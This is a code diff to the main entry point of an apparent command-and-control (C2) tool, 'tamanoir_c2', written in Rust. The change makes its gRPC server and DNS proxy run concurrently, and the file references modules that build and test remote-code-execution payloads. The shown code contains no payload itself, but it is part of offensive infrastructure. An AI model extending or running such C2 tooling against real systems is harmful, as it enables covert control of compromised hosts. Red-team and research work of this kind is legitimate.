@@ -1,15 +1,10 @@
 use clap::Parser;
-use log::{error, info};
+use log::error;
 use tamanoir_c2::{
     cli::{Command, Opt, RceCommand},
-    handlers::{
-        dns_proxy::DnsProxy,
-        grpc::{greeter::MyGreeter, tamanoir::greeter_server::GreeterServer},
-        rce::{builder::build, tester::test_bin},
-    },
-    TargetArch,
+    handlers::rce::{builder::build, tester::test_bin},
+    serve_proxy, serve_tonic, TargetArch,
 };
-use tonic::transport::Server;
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
@@ -61,15 +56,7 @@ async fn main() -> anyhow::Result<()> {
             dns_ip,
             payload_len,
         } => {
-            let addr = "[::1]:50051".parse().unwrap();
-            let greeter = MyGreeter::default();
-            info!("Starting grpc server");
-            Server::builder()
-                .add_service(GreeterServer::new(greeter))
-                .serve(addr)
-                .await?;
-            info!("Starting dns proxy");
-            DnsProxy::new(port, dns_ip, payload_len).serve().await?;
+            tokio::try_join!(serve_tonic(), serve_proxy(port, dns_ip, payload_len))?;
         }
     }
     Ok(())
